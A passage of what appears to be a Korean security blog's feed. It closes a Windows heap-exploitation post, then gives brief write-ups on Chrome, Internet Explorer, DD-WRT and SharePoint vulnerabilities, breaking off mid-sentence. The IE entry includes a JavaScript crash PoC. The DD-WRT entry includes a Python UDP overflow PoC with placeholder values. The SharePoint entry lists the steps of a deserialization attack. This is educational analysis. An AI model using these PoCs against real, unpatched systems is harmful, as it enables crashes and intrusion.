&#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xAC83;</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;. </p><p>A &#xAC1D;&#xCCB4;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xC758; B&#xB85C; &#xC7AC; &#xD560;&#xB2F9;&#xD558;&#xB294; UAF &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xAC00;&#xC815;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>A&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>A&#xC640; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xC758; B&#xB97C; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">UserBlock</a>&#xC744; &#xBAA8;&#xB450; &#xCC44;&#xC6B8;&#xB54C;&#xAE4C;&#xC9C0; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%208.png" alt="pwncoolsexy-part3/Untitled%208.png"></p><ul><li>A&#xB97C; &#xD574;&#xC81C;&#xD55C; &#xC774;&#xD6C4; B&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xBA74; <code>UserBlock</code>&#xC5D0;&#xB294; &#xD574;&#xC81C;&#xD55C; A &#xACF5;&#xAC04;&#xBC16;&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xC81C;&#xB41C; A chunk&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xAC8C; &#xB418;&#xACE0; UAF&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%209.png" alt="pwncoolsexy-part3/Untitled%209.png"></p><p>&#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xB294; HITCON CTF 2019 QUAL&#xC5D0;&#xC11C; &#xCD9C;&#xC81C;&#xB41C; &#xBB38;&#xC81C;&#xC778; dadadb&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; LFH&#xC758; reuse attack &#xC774;&#xC288;&#xC5D0; &#xB300;&#xD574; &#xC790;&#xC138;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U">https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U</a></p><p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21106: Double free/UAF Issue in Google Chrome</title>
    <link href="/2021/03/27/fabu1ous/2021-03-27/"/>
    <url>/2021/03/27/fabu1ous/2021-03-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1148749">Issue 1148749: Double free/UAF in RegionDataLoaderImpl::DeleteThis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 87.0.4280.141 </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Google Chrome 87.0.4280.141 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Use after free &#xCDE8;&#xC57D;&#xC810;(CVE-2021-21106)&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC545;&#xC131; HTML &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; Chrome&#xC758; renderer process&#xC5D0; &#xC811;&#xADFC; &#xBC0F; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD1B5;&#xD55C; sandbox escape&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">46</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegionDataLoaderImpl::OnRegionDataLoaded</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> success,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">47</span>                                               <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; country_code,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">48</span>                                               <span class="hljs-keyword">int</span> unused_rule_count)</span> </span>{ <span class="hljs-number">49</span>   timer_.Stop(); <span class="hljs-number">50</span>   <span class="hljs-keyword">if</span> (!callback_.is_null()) { <span class="hljs-number">51</span>     <span class="hljs-keyword">if</span> (success) { <span class="hljs-number">52</span>       <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> best_region_tree_language_tag; <span class="hljs-number">53</span>       ::i18n::<span class="hljs-function">addressinput::RegionDataBuilder <span class="hljs-title">builder</span><span class="hljs-params">(&amp;region_data_supplier_)</span></span>; <span class="hljs-number">54</span>       callback_.Run( <span class="hljs-number">55</span>           builder <span class="hljs-number">56</span>               .Build(country_code, app_locale_, &amp;best_region_tree_language_tag) <span class="hljs-number">57</span>               .sub_regions()); <span class="hljs-number">58</span>     } <span class="hljs-keyword">else</span> { <span class="hljs-number">59</span>       callback_.Run(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">const</span> ::i18n::addressinput::RegionData*&gt;()); <span class="hljs-number">60</span>     } <span class="hljs-number">61</span>   } <span class="hljs-number">62</span>   <span class="hljs-comment">// The deletion must be asynchronous since the caller is not quite done with</span> <span class="hljs-number">63</span>   <span class="hljs-comment">// the preload supplier.</span> <span class="hljs-number">64</span>   base::ThreadTaskRunnerHandle::Get()-&gt;PostTask( <span class="hljs-number">65</span>       FROM_HERE, base::BindOnce(&amp;RegionDataLoaderImpl::DeleteThis, <span class="hljs-number">66</span>                                 base::Unretained(<span class="hljs-keyword">this</span>))); <span class="hljs-number">67</span> } <span class="hljs-number">68</span>  <span class="hljs-number">69</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegionDataLoaderImpl::DeleteThis</span><span class="hljs-params">()</span> </span>{ <span class="hljs-number">70</span>   <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>; <span class="hljs-number">71</span> }</code></pre><p>&#xD30C;&#xC77C; <code>components/autofill/core/browser/geo/region_data_loader_impl.cc</code>&#xC18D; &#xCF54;&#xB4DC; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. <code>RegionDataLoaderImpl</code>&#xC744; &#xAD6C;&#xC131;&#xD560; &#xB54C; &#xD568;&#xC218; <code>OnRegionDataLoaded</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA70; PostTask&#xAC00; &#xD568;&#xC218; <code>DeleteThis</code>&#xB97C; &#xD638;&#xCD9C;&#xD574;(line #64) &#xD3EC;&#xC778;&#xD130; <code>this</code>&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; &#xD55C; &#xBC88;&#xC5D0; &#xB9CE;&#xC740; <code>RegionDataLoaderImpl</code>&#xC744; &#xAD6C;&#xC131;&#xD560; &#xB54C; &#xB3D9;&#xC77C;&#xD55C; PostTask&#xB97C; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xC704; &#xC791;&#xC5C5;&#xC744; &#xB450; &#xBC88; &#xC218;&#xD589;&#xD558;&#xAC8C;&#xB418;&#xACE0; &#xD3EC;&#xC778;&#xD130;<code>this</code>&#xAC00; &#xB450; &#xBC88; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26411 : Internet Explorer Use-After-Free vulnerability</title>
    <link href="/2021/03/26/l0ch/2021-03-26/"/>
    <url>/2021/03/26/l0ch/2021-03-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">CVE-2021-26411: Internet Explorer mshtml use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft&#xC758; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC778; Internet Explorer&#xC5D0;&#xC11C; &#xD30C;&#xC2F1;&#xACFC; &#xB80C;&#xB354;&#xB9C1;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>mshtml</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; PoC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-keyword">var</span> elem = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;xxx&apos;</span>); <span class="hljs-keyword">var</span> attr1 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&apos;yyy&apos;</span>); <span class="hljs-keyword">var</span> attr2 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&apos;zzz&apos;</span>); <span class="hljs-keyword">var</span> obj = {};obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{elem.clearAttributes();<span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;};attr1.nodeValue = obj;attr2.nodeValue = <span class="hljs-number">123</span>;elem.setAttributeNode(attr1);elem.setAttributeNode(attr2);elem.removeAttributeNode(attr1); &lt;/script&gt;</code></pre><ol><li>HTML element &#xAC1D;&#xCCB4; <code>elem</code> &#xC640; HTML attribute &#xAC1D;&#xCCB4; <code>attr1</code>, <code>attr2</code> &#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>attr1</code>&#xACFC; <code>attr2</code> &#xC758; <code>nodeValue</code>&#xC5D0; &#xAC12;&#xC744; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>attr1</code>&#xC758; <code>nodeValue</code>&#xC5D0;&#xB294; <code>valueOf</code> &#xD568;&#xC218;&#xAC00; &#xC624;&#xBC84; &#xB85C;&#xB4DC;&#xB41C; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>attr1</code> &#xBC0F; <code>attr2</code>&#xB97C; &#xC694;&#xC18C; &#xAC1C;&#xCCB4; <code>elem</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>elem.removeAttributeNode(attr1)</code>&#xC744; &#xD638;&#xCD9C;&#xD574; <code>elem</code>&#xC5D0;&#xC11C; <code>attr1</code>&#xC744; &#xC81C;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>removeAttributeNode</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; <code>elem</code> &#xAC1D;&#xCCB4;&#xC758; &#xBAA8;&#xB4E0; &#xC18D;&#xC131; &#xAC1D;&#xCCB4;&#xC778; <code>attr1</code> &#xACFC; <code>attr2</code>&#xB97C; &#xC9C0;&#xC6B0;&#xAE30; &#xC704;&#xD574; <code>clearAttributes</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xB3D9;&#xC548; <code>valueOf</code> &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xCF5C;&#xBC31;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>valueOf</code> &#xCF5C;&#xBC31;&#xC774; &#xC885;&#xB8CC;&#xB418;&#xBA74; IE &#xD0ED; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; NULL &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p><code>removeAttributeNode(attr1)</code>&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>CBase::GetIntoBSTRAt</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>attr1</code>&#xC758; <code>nodeValue</code>&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; BSTR&#xB85C; &#xBCC0;&#xD658;&#xD574; BSTR &#xAC12;&#xC744; <code>CAttribute.nodeValue(+0x30)</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>valueOf</code> &#xCF5C;&#xBC31;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;. <code>valueOf</code> &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xC758; <code>elem.clearAttributes()</code>&#xB85C; &#xC778;&#xD574; <code>attr1</code>&#xC774; &#xD574;&#xC81C;&#xB41C; &#xC774;&#xD6C4; &#xC815;&#xC0C1;&#xC801;&#xC778; <code>attr1</code>&#xC758; Delete &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC758;&#xD574; Double Free Bug&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; arbitrary read/write&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uaf</tag>
      
      <tag>microsoft</tag>
      
      <tag>use after free</tag>
      
      <tag>internet explorer</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27137: DD-WRT UPNP Buffer Overflow</title>
    <link href="/2021/03/25/insu/2021-03-25/"/>
    <url>/2021/03/25/insu/2021-03-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffer-overflow/">SSD Advisory &#x2013; DD-WRT UPNP Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DD-WRT</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9AC;&#xB205;&#xC2A4; &#xAE30;&#xBC18;&#xC758; &#xBB34;&#xC120; &#xB77C;&#xC6B0;&#xD130; &#xBC0F; &#xC561;&#xC138;&#xC2A4; &#xD3EC;&#xC778;&#xD2B8; &#xD38C;&#xC6E8;&#xC5B4;&#xC778; DD-WRT&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD1B5;&#xD574; Code Execution&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Universal Plug and Play(UPNP)&#xB294; &#xCEF4;&#xD4E8;&#xD130;, &#xD504;&#xB9B0;&#xD130;, &#xC778;&#xD130;&#xB137; &#xAC8C;&#xC774;&#xD2B8;&#xC6E8;&#xC774;, &#xC640;&#xC774;&#xD30C;&#xC774; access point, &#xBAA8;&#xBC14;&#xC77C; &#xC7A5;&#xCE58;&#xC640; &#xAC19;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC7A5;&#xCE58;&#xB4E4;&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xC11C;&#xB85C;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC11C;&#xBE44;&#xC2A4; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC5D0;&#xC11C; DD-WRT&#xC758; UPNP&#xB294; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. UPNP&#xB294; UDP &#xD615;&#xC2DD;&#xC758; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C; DD-WRT&#xC5D0; UPNP &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; DD-WRT&#xC758; LAN&#xC5D0; &#xC788;&#xB294; &#xD574;&#xCEE4;&#xAC00; &#xD070; &#xD06C;&#xAE30;&#xC758; <code>uuid</code> &#xAC12;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>ssdp.c</code> &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://ssd-disclosure.com/wp-content/uploads/2021/03/image-1024x590.png" alt="img"></p><p>name &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xB294; 128 bytes&#xC774;&#xC9C0;&#xB9CC;, &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; POC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> sockettarget_ip = <span class="hljs-string">&quot;192.168.15.124&quot;</span> <span class="hljs-comment"># IP Address of Target</span>off = <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">164</span>ret_addr = <span class="hljs-string">&quot;AAAA&quot;</span> payload = off + ret_addrpacket = \    <span class="hljs-string">&apos;M-SEARCH * HTTP/1.1\r\n&apos;</span> \    <span class="hljs-string">&apos;HOST:239.255.255.250:1900\r\n&apos;</span> \    <span class="hljs-string">&apos;ST:uuid:&apos;</span>+payload+<span class="hljs-string">&apos;\r\n&apos;</span> \    <span class="hljs-string">&apos;MX:2\r\n&apos;</span> \    <span class="hljs-string">&apos;MAN:&quot;ssdp:discover&quot;\r\n&apos;</span> \    <span class="hljs-string">&apos;\r\n&apos;</span>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)s.sendto(packet.encode(), (target_ip, <span class="hljs-number">1900</span>) )</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>dd-wrt</tag>
      
      <tag>bof</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27076: SharePoint Replay Style Deserialization 취약점</title>
    <link href="/2021/03/25/idioth/2021-03-25/"/>
    <url>/2021/03/25/idioth/2021-03-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint">CVE-2021-27076: A REPLAY-STYLE DESERIALIZATION ATTACK AGAINST SHAREPOINT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft SharePoint</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint&#xC5D0;&#xC11C; session state&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. SharePoint&#xC758; InfoPath&#xC5D0;&#xC11C; &#xBB38;&#xC11C;&#xB294; serialize &#xB41C; &#xD6C4; session state&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. session state&#xC5D0;&#xC11C; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130;&#xB294; <code>BinaryFormatter.Deserialize</code>&#xB85C; &#xC804;&#xC1A1;&#xB418;&#xB294;&#xB370;, &#xD574;&#xCEE4;&#xAC00; arbitrary data&#xB97C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>SharePoint &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; session state mechanism&#xC744; &#xD1B5;&#xD574; &#xCCA8;&#xBD80; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xB370;&#xC774;&#xD130;&#xB294; &#xCCA8;&#xBD80; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; session state&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key(<code>editingSessionId</code>)&#xB97C; &#xD1B5;&#xD574; &#xAC80;&#xC0C9;&#xB429;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>DocumentSessionState</code> Deserialization &#xB370;&#xC774;&#xD130;&#xB294; Deserialization session state&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key&#xB97C; &#xD1B5;&#xD574; &#xAC80;&#xC0C9;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>editingSessionId</code>&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0; &#xC758;&#xD574; &#xC870;&#xC791;&#xB420; &#xC218; &#xC788;&#xC5B4; &#xCCA8;&#xBD80; &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xB97C; <code>DocumentSessionState</code> Deserialization&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xB54C; session state key&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC5C6;&#xACE0;, &#xC11C;&#xBC84;&#xC758; <code>DocumentSessionState</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xCCA8;&#xBD80; &#xD30C;&#xC77C; mechanism&#xC758; document&#xC758; state key&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xC5EC; serialize &#xB41C; <code>DocumentSessionState</code>&#xB97C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xB85C; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC804;&#xCCB4;&#xC801;&#xC778; &#xACF5;&#xACA9; &#xD750;&#xB984;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>InfoPath &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xC0C8; &#xD56D;&#xBAA9;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD56D;&#xBAA9;&#xC5D0; deserialize &#xB420; arbitrary object&#xB97C; &#xD3EC;&#xD568;&#xD55C; fake InfoPath <code>DocumentSessionState</code> &#xD30C;&#xC77C;&#xC744; &#xCCA8;&#xBD80;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD398;&#xC774;&#xC9C0;&#xC758; HTML&#xC5D0;&#xC11C; document&#xC758; state key&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</li><li><code>FormServerAttachments.aspx</code> &#xD398;&#xC774;&#xC9C0;&#xC5D0; document&#xC758; state key&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xC5EC; serialize &#xB41C; <code>DocumentSessionState</code>&#xB97C; &#xC5BB;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xBC18;&#xD658;&#xB41C; &#xB370;&#xC774;&#xD130;&#xC5D0;&#xC11C; 3&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xD55C; &#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC758; state key&#xB97C; &#xCD94;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC758; state key&#xB97C; undocumented client-side API&#xC5D0; &#xC804;&#xC1A1;&#xD558;&#xC5EC; deserialization mechnism&#xC5D0;&#xC11C; &#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC740; arbitrary object&#xAC00; 